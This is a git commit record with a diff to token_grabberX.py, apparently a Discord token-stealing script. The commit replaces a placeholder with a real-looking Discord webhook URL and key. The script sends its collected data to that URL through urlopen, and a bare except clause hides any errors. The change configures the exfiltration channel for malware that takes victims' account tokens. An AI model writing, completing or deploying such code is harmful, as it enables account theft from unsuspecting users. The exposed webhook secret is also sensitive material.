2ac7b1a30b08a57997f083fa43eb033ce47117d2
Decent1001 <97753393+Decent1001@users.noreply.github.com>
2022-01-23 00:35:24 +0200

    Update token_grabberX.py

--- token_grabberX.py
+++ token_grabberX.py
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/934575990250799184/zQ7ytULMovG7pqWAB9hUjR3uvvw-LPDL2ERGZZjkcd825v8uwdmI3SXXJBZc7b3GainB", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
